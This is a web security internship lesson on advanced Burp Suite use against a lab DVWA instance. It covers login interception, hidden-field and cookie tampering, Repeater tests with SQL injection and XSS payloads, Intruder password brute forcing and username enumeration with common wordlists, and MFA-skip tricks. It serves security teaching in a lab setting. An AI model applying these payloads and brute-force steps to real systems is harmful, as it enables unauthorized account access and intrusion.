# Day 16 — Burp Suite Advanced
### ApexPlanet Internship | Task 3: Web Application Security
**Timeline:** Days 25–36 | **Author:** Professorshubhx

---

## What We're Covering Today

Day 6 introduced Burp Suite basics — proxy setup, intercepting requests, and the Repeater tool. Today we go deeper into two specific areas the task requires:

- Intercepting and modifying login requests
- Performing fuzzing and brute force attacks using the Intruder tool

Both are core skills for web application security testing. By the end you'll be able to intercept any web request, manipulate it in real time, and automate attacks against login forms and other parameters.

---

## Quick Setup Reminder

```
1. Open Burp Suite: burpsuite &
2. Proxy → Options → Confirm listener on 127.0.0.1:8080
3. Firefox → Settings → Network → Manual proxy → 127.0.0.1:8080
4. Browse to http://burpsuite → Download CA cert → Import into Firefox
5. Target: http://192.168.56.104/dvwa
```

---

## 1. Intercepting and Modifying Login Requests

### Basic Login Interception

```
DVWA → Proxy → Intercept is ON
Go to: http://192.168.56.104/dvwa/login.php
Fill: Username: admin  Password: wrongpassword
Click Login
```

Burp catches the request before it reaches the server:

```
POST /dvwa/login.php HTTP/1.1
Host: 192.168.56.104
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=abc123

username=admin&password=wrongpassword&Login=Login
```

You can now:
- Read the parameters being sent
- Modify any value before forwarding
- Drop the request entirely

### Modifying the Request in Real Time

Change `password=wrongpassword` to `password=password` directly in Burp's intercept window.

Click **Forward**.

The modified request goes to the server — login succeeds with a password you never typed in the browser. This demonstrates that client-side controls (JavaScript validation, hidden fields) mean nothing — Burp sits between browser and server and can change anything.

### What to Look for in Login Requests

```
username=admin&password=test123&Login=Login&user_token=a1b2c3d4

Parameters to inspect:
username        Can you try other usernames? admin, administrator, root
password        Target for brute force
Login           Fixed value — usually ignore
user_token      CSRF token — changes each request, needed for Intruder
```

### Manipulating Hidden Fields

Hidden form fields are invisible to users but fully visible in Burp. They're often used to pass values the developer doesn't want users to change — like price, role, or account level.

```
# Original request
POST /dvwa/buy.php
price=99.99&item_id=1&quantity=1

# Modified in Burp
price=0.01&item_id=1&quantity=1
```

The server trusts these values because developers assumed users can't see them. Burp proves otherwise.

### Modifying Cookies

```
# Original cookie
Cookie: PHPSESSID=abc123; security=high

# Change security level to low without going through the UI
Cookie: PHPSESSID=abc123; security=low
```

This bypasses DVWA's security level setting — useful when testing payloads that Medium/High security blocks.

### Changing Request Methods

Some applications handle GET and POST differently. In Burp Repeater, right-click the request → **Change request method** to switch between GET and POST — sometimes bypassing controls.

---

## 2. Burp Suite Repeater — Manual Testing

Repeater lets you send the same request repeatedly with modifications and see the response each time — perfect for manual vulnerability testing.

### Testing SQL Injection via Repeater

```
1. Intercept the DVWA SQL Injection form submission
2. Right-click → Send to Repeater (Ctrl+R)
3. In Repeater, find the id parameter
4. Change id=1 to id=1'
5. Click Send
6. Check Response tab — look for MySQL error
```

Response comparison:

```
id=1            → First name: admin  Surname: admin  (normal)
id=1'           → MySQL error message (vulnerable)
id=1 OR 1=1--   → All users returned (confirmed SQLi)
```

### Testing XSS via Repeater

```
# Change the name parameter in reflected XSS endpoint
name=test                    → Hello test
name=<script>alert(1)</script>  → Check if script tags appear unescaped in response
name=<img src=x onerror=alert(1)>  → Alternative if script filtered
```

### Comparing Responses

One of the most powerful things in Repeater is comparing responses side by side. Send the same request with different payloads and look for:

```
Response length difference      → Different content returned (data extracted)
Response time difference        → Time-based blind SQLi
Status code difference          → 200 vs 302 vs 500
Different content in body       → Boolean-based blind SQLi
```

---

## 3. Burp Suite Intruder — Fuzzing and Brute Force

Intruder automates sending a large number of requests with different payloads. It's used for:
- Brute forcing login credentials
- Fuzzing parameters for vulnerabilities
- Enumerating usernames
- Testing all values in a range

### Sending a Request to Intruder

```
1. Intercept the DVWA login request in Proxy
2. Right-click → Send to Intruder (Ctrl+I)
3. Go to Intruder tab
```

### Step 1 — Positions Tab

The Positions tab shows your request with payload markers (`§`). Burp auto-marks all parameters — you need to clear them and mark only what you want to fuzz.

```
Click "Clear §" to remove all markers

Original request:
username=admin&password=wrongpassword&Login=Login

After clearing, mark only the password field:
username=admin&password=§wrongpassword§&Login=Login
```

Highlight the value `wrongpassword` and click **"Add §"** — it becomes `§wrongpassword§`.

### Step 2 — Attack Types

```
Sniper          One payload list, one position
                Tests each payload in each position sequentially
                Use for: brute force single parameter, fuzzing one field

Battering Ram   Same payload in ALL positions simultaneously
                Use for: username = password (same value in both)

Pitchfork       Multiple payload lists, one per position, iterated together
                Payload 1: admin → Payload 2: password (row 1)
                Payload 1: root  → Payload 2: toor     (row 2)
                Use for: testing known username:password pairs

Cluster Bomb    Multiple payload lists, ALL combinations tested
                Use for: brute force where you want every username with every password
                Warning: n × m requests — can be very large
```

For login brute force with one unknown (password), use **Sniper**.
For brute force with both unknown (username + password), use **Cluster Bomb**.

### Step 3 — Payloads Tab

```
Payload type: Simple list
Load a wordlist from Kali:
  /usr/share/wordlists/rockyou.txt     (14 million passwords)
  /usr/share/wordlists/metasploit/unix_passwords.txt  (smaller, faster)
  /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt

Or type manually for a quick test:
  password
  admin
  123456
  password123
  dvwa
  letmein
```

### Step 4 — Options Tab (Important Settings)

```
Number of threads:    1 (Community Edition is rate limited anyway)
Follow redirects:     Always
Store requests:       Yes (to review later)
Grep — Match:         Add "Welcome" or "Login successful"
                      Requests where response contains this = successful login
Grep — Extract:       Extract specific text from response for comparison
```

### Step 5 — Start Attack

Click **Start Attack**. A new window shows all requests with:
```
Request #   Payload         Status   Length   Comment
1           password        302      517      ← Different length = possible hit
2           admin           200      1234
3           123456          200      1234
4           password123     302      517      ← Another redirect
```

**What to look for:**
- Different status code (302 redirect instead of 200 = login succeeded)
- Different response length (more or less content than failed attempts)
- Specific text in Grep Match column

Sort by **Length** column — successful logins usually have a different response length.

### Brute Forcing DVWA Login

```
Target: http://192.168.56.104/dvwa/login.php
Method: POST
Parameters: username=admin&password=§test§&Login=Login

Payload: Common password wordlist

Success indicator:
  Failed login returns: "Login failed"
  Successful login redirects to index.php (302)
  OR response contains "Welcome" or "Logout"
```

Add a Grep Match rule for "Welcome to Dvwa" — any request where this appears in the response is a successful login.

### Username Enumeration with Intruder

If the application gives different responses for valid vs invalid usernames, you can enumerate valid usernames:

```
username=§admin§&password=wrongpassword&Login=Login

Payloads: Username wordlist
/usr/share/seclists/Usernames/Names/names.txt

Look for:
  "Password incorrect" → username exists
  "Username not found" → username doesn't exist
  Different response length between the two
```

---

## 4. Practical — Brute Forcing DVWA Login Step by Step

```
Step 1: Log out of DVWA completely

Step 2: Turn on Burp Proxy intercept

Step 3: Enter wrong credentials in DVWA login
  Username: admin
  Password: wrongpass

Step 4: Capture in Burp → Send to Intruder

Step 5: Intruder → Positions tab
  Click Clear §
  Highlight wrongpass → Add §
  username=admin&password=§wrongpass§&Login=Login

Step 6: Intruder → Payloads tab
  Payload type: Simple list
  Add these manually:
    letmein
    admin
    password
    12345
    password123
    dvwa
    abc123

Step 7: Options → Grep - Match → Add → type: Welcome

Step 8: Start Attack

Step 9: Watch results — look for:
  Status 302 (redirect = success)
  OR "Welcome" column shows a tick
  The matching payload = the correct password
```

Result: `password` returns 302 — admin's password is confirmed.

---

## 5. Bypassing Login with Burp — Parameter Manipulation

Beyond brute force, Burp can test for logic flaws in login:

### Role Escalation via Parameter Tampering

```
# Normal user login request
POST /dvwa/login.php
username=gordonb&password=abc123&role=user

# Modified in Burp
username=gordonb&password=abc123&role=admin
```

If the server trusts the `role` parameter from the client — privilege escalation achieved.

### Bypassing Multi-Factor Authentication

```
# Normal flow
Step 1: POST /login → username + password → server sends OTP
Step 2: POST /verify → otp_code → logged in

# Burp manipulation
Step 1: POST /login → username + password → success response captured
Step 2: Skip /verify entirely — forward the session from Step 1 directly to /dashboard
```

Some applications check credentials but then trust the session without enforcing the MFA step.

### Forced Browsing

After intercepting a response, you can modify it before the browser receives it:

```
# Server returns: HTTP/1.1 302 Found → Location: /login.php (rejected)
# Modify to: HTTP/1.1 200 OK  (Burp response intercept)
# Browser now renders the admin page
```

Enable response interception: Proxy → Options → Intercept responses → "Intercept responses based on rules"

---

## 6. Saving and Organizing Burp Work

### Target Site Map

Every request you make through Burp is recorded in the Target → Site Map tab. This builds a complete map of the application:

```
Target → Site Map
  ├── http://192.168.56.104
  │   ├── /dvwa/
  │   │   ├── /dvwa/login.php
  │   │   ├── /dvwa/index.php
  │   │   ├── /dvwa/vulnerabilities/
  │   │   │   ├── /dvwa/vulnerabilities/sqli/
  │   │   │   ├── /dvwa/vulnerabilities/xss_r/
  │   │   │   └── ...
```

Right-click any item → Send to Repeater / Intruder / Scanner.

### Saving Burp Project

```
File → Save Project (Pro version)
File → Save Copy of State (Community) → saves all requests/responses
```

### Exporting Requests

Right-click any request in Proxy History:
- Copy as curl command — paste in terminal to replay
- Save item — save full request/response

---

## 7. Burp Decoder and Comparer

### Decoder — Encoding and Decoding

```
Burp → Decoder tab

Paste any value and decode/encode:
Base64:     YWRtaW4= → admin
URL:        admin%40example.com → admin@example.com
HTML:       &lt;script&gt; → <script>
Hex:        61646d696e → admin
ASCII hex:  Same as hex but displayed differently
Gzip:       Compressed data

Use case: Find a cookie that looks like base64 → decode → it says "role=user"
          Change to "role=admin" → re-encode → replace in request
```

### Comparer — Diffing Responses

```
Burp → Comparer tab

Send two different responses here:
  Right-click response in Proxy History → Send to Comparer

Then: Comparer → Compare (Words or Bytes)
Shows exactly what's different between two responses

Use case:
  Compare failed login vs successful login response
  Compare normal page vs SQL injection response
  Spot subtle differences that indicate vulnerability
```

---

## Practice Tasks

1. Intercept a DVWA login with wrong credentials in Burp — modify the password to `password` in intercept — confirm login succeeds
2. Intercept the DVWA SQL Injection form — send to Repeater — test 5 different payloads and compare responses
3. In Proxy, change the `security` cookie from `high` to `low` — confirm DVWA security level changes without using the UI
4. Send a DVWA login request to Intruder — set up Sniper attack on the password parameter with a 10-word wordlist — identify the correct password from the results
5. Set up Grep Match in Intruder for "Welcome" — run the attack again — observe which request triggers the match
6. Try Cluster Bomb with 3 usernames and 5 passwords — observe total number of requests generated
7. Use Decoder to base64 decode the string `YWRtaW4=` — re-encode `administrator` in base64
8. Use Decoder to URL-encode the payload `<script>alert(1)</script>`
9. Send two DVWA responses to Comparer — one from failed login, one from successful — identify the differences
10. Use Target → Site Map to explore the full DVWA application structure — count how many unique paths are discovered

---

## Quick Reference

```
KEYBOARD SHORTCUTS              ATTACK TYPES
Ctrl+R    Send to Repeater      Sniper       One position, one list
Ctrl+I    Send to Intruder      Battering Ram  Same payload all positions
Ctrl+U    URL encode            Pitchfork    Multiple lists, row by row
Ctrl+B    Base64 encode         Cluster Bomb All combinations
Ctrl+Shift+B  Base64 decode

INTRUDER SETUP                  SUCCESS INDICATORS
1. Send request to Intruder     Status 302 (redirect after login)
2. Positions → Clear § → Add §  Different response length
3. Payloads → load wordlist      Grep Match column ticked
4. Options → Grep Match         Specific text in response body
5. Start Attack
6. Sort by Length column

WHAT TO MODIFY IN BURP
Login parameters                Hidden fields (price, role, id)
Cookies (security, session)     File upload content-type
CSRF tokens                     Request method (GET↔POST)
```

---

## Resources

- Burp Suite Documentation: https://portswigger.net/burp/documentation
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- SecLists Wordlists: https://github.com/danielmiessler/SecLists
- Burp Suite Shortcuts: https://portswigger.net/burp/documentation/desktop/keyboard-shortcuts
- Defronix Academy | Mentor: Nitesh Singh Sir

---

## Connect

- **LinkedIn:** [Shubham Chaurasiya](https://www.linkedin.com/in/shubham-chaurasiya-60932a359/)
- **TryHackMe:** [professorshubhx](https://tryhackme.com/p/professorshubhx)

---

*Day 16 Complete | Next: Day 17 — Web Security Headers (securityheaders.com analysis, Apache config)*
